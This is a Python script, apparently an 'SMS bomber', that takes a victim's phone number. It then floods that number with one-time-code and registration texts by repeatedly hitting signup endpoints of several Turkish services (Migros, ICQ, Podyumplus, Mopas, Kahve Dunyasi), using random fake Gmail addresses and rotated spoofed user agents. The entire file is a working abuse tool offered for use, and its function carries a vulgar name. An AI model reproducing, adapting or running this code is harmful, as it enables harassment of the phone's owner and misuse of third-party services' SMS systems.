import requests as req
import fake_useragent
import colorama
from colorama import Fore
import string
import os
import threading
import json
import random

os.system('cls')
colorama.init(autoreset=True)

banner = Fore.MAGENTA+"""
 $$$$$$\  $$\      $$\  $$$$$$\        $$$$$$$\   $$$$$$\  $$\      $$\ $$$$$$$\  $$$$$$$$\ $$$$$$$\  
$$  __$$\ $$$\    $$$ |$$  __$$\       $$  __$$\ $$  __$$\ $$$\    $$$ |$$  __$$\ $$  _____|$$  __$$\ 
$$ /  \__|$$$$\  $$$$ |$$ /  \__|      $$ |  $$ |$$ /  $$ |d$$$$\  $$$$ |$$ |  $$ |$$ |      $$ |  $$ |
\$$$$$$\  $$\$$\$$ $$ |\$$$$$$\        $$$$$$$\ |$$ |  $$ |$$\$$\$$ $$ |$$$$$$$\ |$$$$$\    $$$$$$$  |
 \____$$\ $$ \$$$  $$ | \____$$\       $$  __$$\ $$ |  $$ |$$ \$$$  $$ |$$  __$$\ $$  __|   $$  __$$< 
$$\   $$ |$$ |\$  /$$ |$$\   $$ |      $$ |  $$ |$$ |  $$ |$$ |\$  /$$ |$$ |  $$ |$$ |      $$ |  $$ |
\$$$$$$  |$$ | \_/ $$ |\$$$$$$  |      $$$$$$$  | $$$$$$  |$$ | \_/ $$ |$$$$$$$  |$$$$$$$$\ $$ |  $$ |
 \______/ \__|     \__| \______/       \_______/  \______/ \__|     \__|\_______/ \________|\__|  \__| """+Fore.RED+'- By ITXCHIAKAR'+f'\n\n          {Fore.LIGHTBLUE_EX}github.com/Itxchi808'


print(banner)
print('\n\n\n\n')
print(Fore.LIGHTMAGENTA_EX+'Enter Phone Number')
phone = input(Fore.LIGHTGREEN_EX+'> '+Fore.RESET)
useragents = list(fake_useragent.FakeUserAgent().data_browsers['chrome'])

chars = string.ascii_lowercase + string.digits
count = 0
def sikis():
    global phone
    global count
    for i in range(10):
        mail = random.sample(chars,12)
        mail = ''.join(mail)
        mail = mail+'@gmail.com'

        data = {
            'email': mail,
            'phoneNumber': phone
        }
        ua = random.choice(useragents)
        header = {
            'User-agent': ua
        }
        try:
            res = req.post('https://www.migros.com.tr/rest/users/v2/register/otp',json=data,headers=header)
            if res.json()['successful'] == True:
                count = count+1
                print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
            else:
                pass
        except:
            pass
    for i in range(15):
        s = req.session() 
        headers3 = {
            "content-type": "application/json",
            "language": "tr",
            "origin": "https://web.icq.com",
            "referer": "https://web.icq.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": ua
        }

        data3 = json.dumps({"reqId":"5062-1662150555","params":{"phone":"90"+phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

        r = s.post('https://u.icq.net/api/v86/rapi/auth/sendCode',headers=headers3,data=data3)
        count = count+1
        print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')

    s.get(f"https://www.podyumplus.com/index.php?route=account/account/control&telephone={phone}")
    count = count+1
    print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')

    for i in range(5):
        s = req.session()
        s.get(f"https://mopas.com.tr/sms/activation?mobileNumber={phone}&pwd=&checkPwd=")
        count = count+1
        print(f'{Fore.GREEN} {count} {Fore.RESET} Adet SMS gönderildi.')
    for i in range(10):
        s = req.session()
        s.get("https://core.kahvedunyasi.com/api/users/sms/send")
        cookie = s.cookies.get("TS01ea2b29")
        header ={
            "Cookie": cookie,
            "User-Agent": ua,
        }  
        data = {
            "mobile_number": phone,
            "token_type": "register_token",
        }
        r = s.post("https://core.kahvedunyasi.com/api/users/sms/send", data=data, headers=header)
        s = req.session()
        s.get(f"https://www.podyumplus.com/index.php?route=account/account/control&telephone={phone}")





for i in range(30):
    t = threading.Thread(target=sikis)
    t.run()

os.system('pause')
